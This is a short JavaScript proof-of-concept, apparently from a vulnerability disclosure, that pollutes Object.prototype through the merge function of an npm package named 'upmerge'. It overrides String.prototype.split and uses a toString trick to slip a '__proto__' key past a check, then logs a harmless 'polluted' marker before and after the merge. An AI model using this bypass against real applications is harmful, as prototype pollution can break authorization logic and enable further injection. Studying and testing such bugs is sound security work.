var arg = ['__proto__'];
var flag1 = true;
arg.toString = function () {
    if (flag1) {
        flag1 = false;
        return 'foo';
    } else {
        return '__proto__';
    }
};
String.prototype.split = function () {
    return [
        arg,
        'polluted'
    ];
};
let upmerge = require('upmerge');
let payload = '{"__proto__":{ "polluted" : "yes" } }';
obj = {};
console.log({}.polluted);
upmerge.merge({}, JSON.parse(payload));
console.log({}.polluted);